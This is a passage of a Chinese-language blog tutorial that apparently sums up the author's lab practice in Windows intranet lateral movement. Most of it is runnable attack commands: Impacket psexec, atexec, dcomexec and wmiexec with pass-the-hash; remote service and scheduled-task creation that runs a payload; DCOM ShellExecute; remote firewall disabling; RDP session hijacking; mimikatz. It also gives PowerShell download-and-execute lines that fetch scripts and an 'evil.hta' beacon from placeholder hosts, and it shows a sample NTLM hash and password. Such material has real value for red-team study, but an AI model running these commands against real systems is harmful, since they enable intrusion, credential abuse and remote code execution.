+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824171830308.png" alt="image-20200824171830308"></p>
+<p><strong>2、Impacket套件psexec利用</strong></p>
+<p>​        当我们仅仅获取hash,可以通过Impacket的psexec进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx ./administrator@192.168.3.144</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173040617.png" alt="image-20200824173040617"></p>
+<pre><code>     使用psexec.exe执行文件上线，首先生成service的exe
+</code></pre>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173346403.png" alt="image-20200824173346403"></p>
+<p>​        将exe上传到边界机上，执行如下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :xxxxx ./administrator@192.168.3.144  -c c:\xxx\xxx\xxx.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200824173708846.png" alt="image-20200824173708846"></p>
+<p><strong>3、SCShell横向移动</strong></p>
+<pre><code>     SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证。一切都通过DCERPC执行。无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。
+</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 192.168.3.144 已知的服务名 &quot;C:\windows\system32\calc.exe&quot; . administrastor Password </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101545936.png" alt="image-20200825101545936"></p>
+<p><strong>4、使用SC命令操作服务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc \\xxx.xxx.xxx.xx create test666 binpath=&quot;C:\Windows\System32\calc.exe&quot;</span><br><span class="line">sc \\xxx.xxx.xxx.xx	query test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx start test666</span><br><span class="line">sc \\xxx.xxx.xxx.xx delete test666</span><br></pre></td></tr></table></figure>
+
+<p>​        我这里测试遇到了1053错误，找了很多方法都没能解决</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825101901258.png" alt="image-20200825101901258"></p>
+<p>​        经过请教部门的同事，虽然启动服务会爆1053错误，但实际上exe也会正常执行。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826200332927.png" alt="image-20200826200332927"></p>
+<p>​        但是这里还是还是有一个问题，就是当启动爆出1053错误后，原本执行的exe进行会消失，假如我们执行的这个exe是cs生成的马，那么使用sc执行后会随着报错的出现导致shell掉了吗？</p>
+<p>​        经过测试发现确实会掉，最终确定爆1053的原因是我们执行的exe不是一个正常的service，因此执行会爆1053的错误，使用cs生成一个services类型的马就可以正常执行了，并且不会报错。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826201410161.png" alt="image-20200826201410161"></p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><strong>什么是计划任务？</strong></p>
+<p>​        所谓的计划任务，就是在某个时间去执行某个操作。</p>
+<p><strong>有什么利用条件？</strong></p>
+<ul>
+<li>有管理员的账号密码</li>
+<li>net use 可以正常连接</li>
+<li>windows计划任务服务”Task Scheduler”启动</li>
+</ul>
+<p><strong>计划任务横向渗透</strong></p>
+<pre><code>     在一些比较老的系统比如xp/2003是使用at命令来执行计划任务操作,在2008可以使用at和schtasks执行计划任务。
+</code></pre>
+<p>1、AT计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ &quot;xxx&quot; /user:administrator</span><br><span class="line">net time \\192.168.3.100 </span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp </span><br><span class="line">at \\192.168.3.100 10:54 /every:25 c:\windows\temp\artifact.exe  开始在远程机器上创建计划任务,只在每个月的25号的晚上10点54准时执行指定的 payload</span><br><span class="line">at \\192.168.3.100 查看远程机器上的所有计划任务列表</span><br><span class="line">at \\192.168.3.100 /delete /yes 删除远程机器上的所有计划任务,也可以用指定 id 的方式删除单条计划任务</span><br><span class="line">net use \\192.168.3.100\admin$ /del 用完以后,立即删除该 ipc 连接</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105332939.png" alt="image-20200825105332939"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825105719447.png" alt="image-20200825105719447"></p>
+<p>2、schtasks计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.100\admin$ /user:&quot;administrator&quot; &quot;xxxx&quot;</span><br><span class="line">net time \\192.168.3.100</span><br><span class="line">xcopy C:\Users\jerry\Desktop\artifact.exe \\192.168.3.100\admin$\temp\</span><br><span class="line">chcp 437 如果目标是中文系统,最好先调整下字符集,不然会有问题</span><br><span class="line">schtasks /create /s 192.168.3.100 /u &quot;administrator&quot; /p &quot;xxxx&quot; /RL HIGHEST /F /tn &quot;WindowsUpdates666&quot; /tr &quot;c:\windows\temp\artifact.exe&quot; /sc DAILY /mo 1 /ST 11:06 在远程的目标机器上创建计划任务</span><br><span class="line">schtasks /run /tn WindowsUpdates666 /s 192.168.3.100 /U &quot; administrator&quot; /P &quot;xxxx&quot; 创建完以后,远程手动运行</span><br><span class="line">schtasks /query /s 192.168.3.100 /U &quot;administrator&quot; /P &quot;xxxx&quot; | findstr &quot;WindowsUpdates666&quot; 运行完以后,随手检查运行状态</span><br><span class="line">schtasks /delete /F /tn WindowsUpdates /s 192.168.3.100 /U &quot; administrator&quot; /P &quot;xxxx&quot; 一般情况下,在我们拿到远程机器 shell 以后,立即删除远程机器上的计划任务即可</span><br></pre></td></tr></table></figure>
+
+<p>​            使用schtasks可以手工去启动计划任务，无需等到特定的时间去触发</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825114556769.png" alt="image-20200825114556769"></p>
+<p>3、impacket套件atexec</p>
+<p>​        通过Task Scheduler服务在目标系统上执行命令，并返回输出结果。atexec 脚本默认只支持 2008 之后的系统，默认弹回来的是system权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe ./administrator:xxxx@192.168.3.144 &quot;whoami /user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825115822194.png" alt="image-20200825115822194"></p>
+<p>​        也可以使用hash来进行认证</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atexec.exe -hashes :xxxxxxxx ./administrator@192.168.3.144 &quot;whoami /user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825120022273.png" alt="image-20200825120022273"></p>
+<h3 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h3><p><strong>什么是DCOM?</strong></p>
+<p>​        DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
+<p><strong>DCOM的基本应用</strong></p>
+<p>​        获取DCOM的程序列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133624007.png" alt="image-20200825133624007"></p>
+<p>​        Get-CimInstance在powershell3.0以上版本存在，只能在win2012以上才能使用。可以使用下面的命令代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825134908675.png" alt="image-20200825134908675"></p>
+<p>​        也可以使用WMIC获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_DCOMApplication  GET /all /FORMAT:list</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825133744491.png" alt="image-20200825133744491"></p>
+<p><strong>使用DCOM在本地执行任意命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825135624138.png" alt="image-20200825135624138"></p>
+<p>​        注意执行上面的命令需要<strong>本地以管理员权限运行</strong>，否则会出现如下错误</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825141214424.png" alt="image-20200825141214424"></p>
+<p><strong>在远程主机上执行任意命令</strong></p>
+<p>利用条件：</p>
+<ul>
+<li><p>域环境下使用</p>
+</li>
+<li><p>Client：关闭防火墙</p>
+</li>
+<li><p>Server：获得域主机内置帐户administrator的口令，可net use连接至Client</p>
+</li>
+</ul>
+<p>1、调用MMC20.Application在远程主机上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.3.73&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd.exe&quot;,$null,&quot;/c calc.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142928339.png" alt="image-20200825142928339"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825142937085.png" alt="image-20200825142937085"></p>
+<p>​        这种方式我在域环境中复现成功，在非域环境未复现成功，会爆如下错误</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825143624888.png" alt="image-20200825143624888"></p>
+<p>2、调用’9BA05972-F6A8-11CF-A442-00A0C90A8F39’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160835771.png" alt="image-20200825160835771"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825160845127.png" alt="image-20200825160845127"></p>
+<p>​        这种方式执行完calc后会直接弹出，而不是在后台执行</p>
+<p>3、调用’C08AFD90-F2A1-11D1-8455-00A0C91F3880’</p>
+<p>​        这种方式适合于win2012和win10，不适合win7</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$com = [Type]::GetTypeFromCLSID(&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;,&quot;192.168.3.73&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161330814.png" alt="image-20200825161330814"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825161345598.png" alt="image-20200825161345598"></p>
+<p><strong>远程操作防火墙</strong></p>
+<p>1、通过sc命令远程关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.3.73 stop mpssvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825162057120.png" alt="image-20200825162057120"></p>
+<p>2、远程修改防火墙配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73 -u  rootkit\administrator -p xxx advfirewall firewall add rule name=&quot;any&quot; protocol=TCP dir=in localport=any action=allow</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163734585.png" alt="image-20200825163734585"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh -r 192.168.3.73  -u rootkit\administrator -p xxx advfirewall firewall Delete rule name=&quot;any&quot;  删除规则</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825163854134.png" alt="image-20200825163854134"></p>
+<p><strong>使用DCOM进行横向移动</strong></p>
+<p>1、使用impacket进行横向移动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe ./administrator:Admin123456@192.168.3.144 &quot;whoami /user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165327715.png" alt="image-20200825165327715"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcomexec.exe -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 ./administrator@192.168.3.144 &quot;whoami /user&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825165658575.png" alt="image-20200825165658575"></p>
+<h3 id="RDP-hijacking"><a href="#RDP-hijacking" class="headerlink" title="RDP hijacking"></a>RDP hijacking</h3><p><strong>什么是RDP hijacking?</strong></p>
+<p>​        RDP劫持可以在我们没有用户密码的情况下获取用户的情况下获取用户的桌面。</p>
+<p><strong>有什么利用条件？</strong></p>
+<ul>
+<li>获取了当前系统的system权限</li>
+<li>通过query user 可以看到多个用户</li>
+</ul>
+<p><strong>如何使用RDP劫持？</strong></p>
+<p>​        通过在任务管理器中，我们可以看到当前有两个用户处于活动状态</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173119488.png" alt="image-20200825173119488"></p>
+<p>​        如果我们想切换到其他用户的会话，右击选择连接，输入密码后即可获取其他用户的rdp桌面</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825173332767.png" alt="image-20200825173332767"></p>
+<p>​        但是当我们具有system权限时，可以无需密码获取其他用户的会话。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200825181732190.png" alt="image-20200825181732190"></p>
+<p>​        当然使用这种方式会把其他正在运行的用户挤下线，对于处于断开状态的用户则没有什么影响。</p>
+<h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p><strong>什么是PTH?</strong></p>
+<p>​        由于 net-ntlm 在验证的时候,是直接用用户密码 hash 而非明文的方式来验证的,因此仅仅知道hash也可以完成认证过程，拿到用户的hash直接去认证并且获取访问资源的这个过程就叫做PTH。</p>
+<p><strong>为什么要使用PTH?</strong></p>
+<p>​        在渗透的过程中，经常会遇到2012及以上的系统，这些系统在默认情况下lsass进程中没有保存明文，只能获取到hash，在解不开密码的情况下，只能通过pth来进行横向渗透。</p>
+<p><strong>PTH的利用条件？</strong></p>
+<ul>
+<li>445端口可以正常访问</li>
+<li>获取目标主机的ntml hash</li>
+</ul>
+<p><strong>利用PTH横向渗透</strong></p>
+<p>1、通过mimikatz进行PTH利用</p>
+<p>​        在cs中使用mimikatz来进行PTH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:xxxxx /run:&quot;powershell -w hidden&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103350172.png" alt="image-20200826103350172"></p>
+<p>​        本来没有权限访问192.168.3.144主机的目录，但是通过令牌替换后，即可访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steal_token PID</span><br><span class="line">shell dir \\192.168.3.144\c$</span><br><span class="line">rev2self  恢复原始用户权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826103511241.png" alt="image-20200826103511241"></p>
+<p>2、使用CS进行PTH横向移动</p>
+<p>​            在CS的选项中选择target</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105348809.png" alt="image-20200826105348809"></p>
+<p>​                对着target右键选择psexec</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105433978.png" alt="image-20200826105433978"></p>
+<p>​            输入用户账户和hash，点击lauch后即可上线</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105236740.png" alt="image-20200826105236740"></p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105635042.png" alt="image-20200826105635042"></p>
+<p>3、使用powershell进行PTH进行横向移动</p>
+<p>​        首先使用cs生成hta文件，并且将这个hta挂载到web上</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826105959580.png" alt="image-20200826105959580"></p>
+<p>​        执行如下命令通过PTH加载evil.hta上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://xxxxxx/Invoke-WMIExec.ps1&#x27;);Invoke-WMIExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxxx -Command \&quot;mshta http://xxx/evil.hta\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826110606262.png" alt="image-20200826110606262"></p>
+<p>​        也可以使用smbexec来进行hash传递上线</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://xxxxx/invoke-SMBExec.ps1&#x27;);Invoke-SMBExec -Target 192.168.3.144</span><br><span class="line">-Domain . -Username Administrator -Hash xxxx -Command \&quot;mshta http://xxxx/evil.hta\&quot; -verbose&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826112135162.png" alt="image-20200826112135162"></p>
+<p>4、使用imapcket套件进行PTH</p>
+<p>​        使用wmiexec进行pth</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -hashes &quot;xxx:xxx&quot; ./Administrator@192.168.3.144 &quot;query user&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​        在cs下执行会有异常，具体原因不详。</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113907462.png" alt="image-20200826113907462"></p>
+<p>​        在cmd下执行正常，如果有问题需要改一下cmd的编码chcp 936</p>
+<p><img src="/2020/08/21/%E5%85%B3%E4%BA%8E%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200826113949941.png" alt="image-20200826113949941"></p>
+<p>​        使用smbexec进行横向渗透,这种方式只能获取半交互的shell,不能在cs下或者webshell下进行利用</p>
